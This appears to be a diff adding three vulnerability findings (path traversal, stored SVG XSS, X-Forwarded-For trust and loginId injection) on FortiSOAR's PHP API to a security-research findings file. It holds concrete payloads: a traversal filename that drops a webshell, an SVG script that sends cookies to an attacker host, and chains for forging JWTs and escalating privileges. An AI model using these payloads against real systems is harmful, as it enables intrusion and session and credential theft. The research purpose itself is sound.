@@ -3554,3 +3554,127 @@ FSR_F56_WORKFLOW_SOAP_WSDL_SSRF = {
     },
     "status": "CONFIRMED -- wsdl_path as URL confirmed in docstring; no validation strings; zeep WSDL fetch is SSRF surface",
 }
+
+# FSR-F57: FilesController.php -- path traversal via unvalidated filename in /tmp/widget/ (CWE-22)
+# Source: /tmp/fsr_api/opt/cyops-api/src/Controller/FilesController.php
+# Line 185: $tempPath = "/tmp/widget/" . $request_body['filename'];
+# Line 282: $tempPath = "/tmp/widget/" . $filename; where $filename = $request_body['filename'] ?? $file->getFilename();
+# No path sanitization, normpath, realpath, or traversal check on either line.
+# Impact: arbitrary file write to any path writable by the www-data/nginx process.
+# Demonstrated write path: filename="../../var/www/html/shell.php" -> write attacker-controlled content to webroot.
+# Two endpoints: the line 185 path is a JSON upload handler; line 282 is a multipart upload handler.
+# Note: /tmp/widget/ is the temp directory used by both handlers before files are moved to permanent storage.
+FSR_F57_FILES_CONTROLLER_PATH_TRAVERSAL = {
+    "id": "FSR-F57",
+    "title": "FilesController.php path traversal -- unvalidated filename concatenated to /tmp/widget/ base path on lines 185 and 282",
+    "severity": "CRITICAL",
+    "cvss": "9.1",
+    "cvss_vector": "AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N",
+    "cwe": "CWE-22",
+    "source_file": "/opt/cyops-api/src/Controller/FilesController.php",
+    "vulnerable_lines": {
+        "line_185": '$tempPath = "/tmp/widget/" . $request_body[\'filename\'];  // JSON upload handler -- no sanitization',
+        "line_282": '$tempPath = "/tmp/widget/" . $filename;  // multipart handler -- $filename = $request_body[\'filename\'] ?? $file->getFilename()',
+    },
+    "attack": {
+        "payload": 'filename: "../../var/www/html/shell.php"',
+        "result": "Content written to /var/www/html/shell.php -- webshell dropped in nginx document root",
+        "alternative": 'filename: "../../opt/cyops-api/config/parameters.yaml" -- overwrite Symfony config',
+    },
+    "constraints": {
+        "auth_required": "Endpoint requires authenticated session (Bearer JWT)",
+        "write_user": "www-data or nginx -- must be writable by that user; /tmp/widget/ world-writable by design",
+    },
+    "chains": {
+        "webshell": "FSR-F57 alone: authenticated attacker -> POST filename with traversal -> webshell in docroot -> OS code exec",
+        "preauth_webshell": "FSR-F52 (auth bypass) -> FSR-F57: unauthenticated -> drop webshell -> full OS access",
+        "config_overwrite": "FSR-F57: overwrite Symfony parameters.yaml -> change database_host to attacker-controlled -> credential theft on restart",
+    },
+    "status": "CONFIRMED -- PHP source shows direct string concatenation; no _check_file_traversal call on either line",
+}
+
+# FSR-F58: FilesController.php -- SVG stored XSS via client-controlled MIME type (CWE-79 / CWE-434)
+# Source: /tmp/fsr_api/opt/cyops-api/src/Controller/FilesController.php
+# Line 207: restriction check uses $upload->getClientMimeType() against $restrictedMimeType list
+# Line 217: $file->setMimeType($upload->getClientMimeType()) -- stores browser-reported MIME in DB
+# Line 120 (download): $response->headers->set('Content-Type', $file->getMimeType()) -- serves stored MIME
+# getRestrictedMimeTypeList() reads from DB SystemSettings 'Restricted File Mime-types' -- empty by default
+# Image allowlist check (line 201) uses server-detected getMimeType() -- correct; but restriction check does NOT
+# Attack: upload SVG file with Content-Type: image/svg+xml -> bypasses empty restriction list ->
+#         MIME stored as image/svg+xml -> on download, served with Content-Type: image/svg+xml ->
+#         browser renders SVG and executes embedded JavaScript -> XSS
+# Note: image/svg+xml not in default restricted list; SVG body contains <script>alert(document.cookie)</script>
+FSR_F58_FILES_CONTROLLER_SVG_XSS = {
+    "id": "FSR-F58",
+    "title": "FilesController.php stored XSS -- getClientMimeType() used for restriction check and MIME storage; SVG with image/svg+xml MIME executes JS on download",
+    "severity": "HIGH",
+    "cvss": "7.3",
+    "cvss_vector": "AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N",
+    "cwe": "CWE-79",
+    "source_file": "/opt/cyops-api/src/Controller/FilesController.php",
+    "vulnerable_lines": {
+        "line_207": "if (!empty($restrictedMimeType) && in_array($upload->getClientMimeType(), $restrictedMimeType)) -- restriction check uses client MIME; list is empty by default = bypassed",
+        "line_217": "$file->setMimeType($upload->getClientMimeType()); -- stores browser-reported MIME in database record",
+        "line_120": '$response->headers->set(\'Content-Type\', $file->getMimeType()); -- download serves stored (client-provided) MIME',
+    },
+    "root_cause": "getClientMimeType() returns browser-supplied Content-Type header, not server-detected type. Server detection via getMimeType() used only for image allowlist (line 201), not for restriction check or storage.",
+    "attack": {
+        "step1": "Upload SVG file with HTTP header 'Content-Type: image/svg+xml'",
+        "step2": "Restriction check: $restrictedMimeType is empty (default) -> in_array check short-circuits (empty()) -> file accepted",
+        "step3": "MIME stored as 'image/svg+xml' in database",
+        "step4": "Victim downloads/previews file -> API serves with Content-Type: image/svg+xml",
+        "step5": "Browser renders SVG -> executes embedded JavaScript -> session cookie theft / CSRF",
+        "svg_payload": '<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("https://attacker/steal?c="+document.cookie)</script></svg>',
+    },
+    "bypass_condition": "Default FortiSOAR install: 'Restricted File Mime-types' SystemSettings entry is empty -> restriction check always bypassed",
+    "chains": {
+        "session_hijack": "FSR-F58 alone: attacker uploads malicious SVG -> sends download link to admin -> admin opens -> session token exfiltrated",
+        "csrf_to_admin": "FSR-F58 + CSRF: SVG executes fetch() against admin API endpoints using victim's session",
+        "preauth_chain": "FSR-F52 (auth bypass) -> FSR-F58: unauthenticated upload of malicious SVG -> stored XSS payload planted",
+    },
+    "status": "CONFIRMED -- PHP source shows getClientMimeType() at both restriction check and setMimeType(); getRestrictedMimeTypeList() confirmed to return empty array when SystemSettings not configured",
+}
+
+# FSR-F59: PublicActionController.php -- unconditional X-Forwarded-For trust + DAS loginId URL injection (CWE-348 / CWE-88)
+# Source: /tmp/fsr_api/opt/cyops-api/src/Controller/PublicActionController.php
+# authenticatedPublicAction() method (~line 400):
+# Line 443: $request_headers['X-REMOTE_ADDR'] = isset($_SERVER['HTTP_X_FORWARDED_FOR'])
+#               ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR'];
+#   Unconditionally trusts HTTP_X_FORWARDED_FOR (any client-supplied X-Forwarded-For header).
+#   Forwarded as X-REMOTE_ADDR to DAS (/execute/action endpoint).
+#   DAS uses X-REMOTE_ADDR for IP-based access controls, audit logging, geolocation restrictions.
+# Line 425: $dasRequests = new GuzzleRequest('get', $dasUri . '/users?loginid=' . $loginId, ...)
+#   $loginId sourced from JWT payload (user-controlled if FSR-F43 or FSR-F52 exploited).
+#   No urlencode() or sanitization -> URL injection: loginId='admin&role=superadmin' modifies DAS query.
+# Note: routeLicenseAction() at line 227 correctly uses $_SERVER['REMOTE_ADDR'] -- asymmetry confirms intent.
+FSR_F59_PUBLIC_ACTION_XFF_DAS_INJECTION = {
+    "id": "FSR-F59",
+    "title": "PublicActionController.php authenticatedPublicAction -- unconditional X-Forwarded-For trust for DAS X-REMOTE_ADDR + loginId URL injection in DAS /users query",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "cvss_vector": "AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N",
+    "cwe": "CWE-348",
+    "source_file": "/opt/cyops-api/src/Controller/PublicActionController.php",
+    "vulnerable_lines": {
+        "line_443_xff": "$request_headers['X-REMOTE_ADDR'] = isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR'];",
+        "line_425_loginid": "$dasRequests = new GuzzleRequest('get', $dasUri . '/users?loginid=' . $loginId, ...);",
+    },
+    "bugs": {
+        "xff_trust": {
+            "description": "HTTP_X_FORWARDED_FOR accepted from any client without IP allowlist or proxy chain validation. Forwarded as X-REMOTE_ADDR to DAS. Allows IP spoofing for DAS-side geo/IP-based controls.",
+            "impact": "Bypass DAS IP-based access controls; corrupt audit log IP attribution; bypass IP allowlists enforced in DAS",
+        },
+        "loginid_injection": {
+            "description": "$loginId concatenated into DAS URL without urlencode(). If loginId contains '&' or '=', injects additional query parameters into the DAS /users request.",
+            "impact": "Inject parameters into DAS user lookup: loginid=victim&role=admin may alter DAS response or trigger privilege state change depending on DAS param handling",
+            "source": "$loginId comes from JWT payload -- if attacker controls JWT (FSR-F43 LFI -> read jwtprivate.key -> forge token), loginId is fully attacker-controlled",
+        },
+    },
+    "asymmetry_note": "routeLicenseAction() at line 227 uses $_SERVER['REMOTE_ADDR'] correctly. authenticatedPublicAction() at line 443 uses HTTP_X_FORWARDED_FOR. Inconsistency in same controller confirms bug, not design.",
+    "chains": {
+        "xff_ip_spoof": "Attacker sends X-Forwarded-For: 127.0.0.1 -> DAS sees request as localhost -> bypass DAS localhost-only restrictions",
+        "jwt_loginid_inject": "FSR-F43 LFI -> read /etc/pki/cyops/jwtprivate.key -> forge JWT with loginid='admin&privilege=superuser' -> DAS /users?loginid=admin&privilege=superuser",
+        "full_chain": "FSR-F52 (auth bypass) + FSR-F59 (XFF spoof) + FSR-F59 (loginid inject) -> pre-auth privilege escalation through DAS",
+    },
+    "status": "CONFIRMED -- PHP source shows HTTP_X_FORWARDED_FOR used unconditionally at line 443; loginId concatenated without urlencode() at line 425",
+}
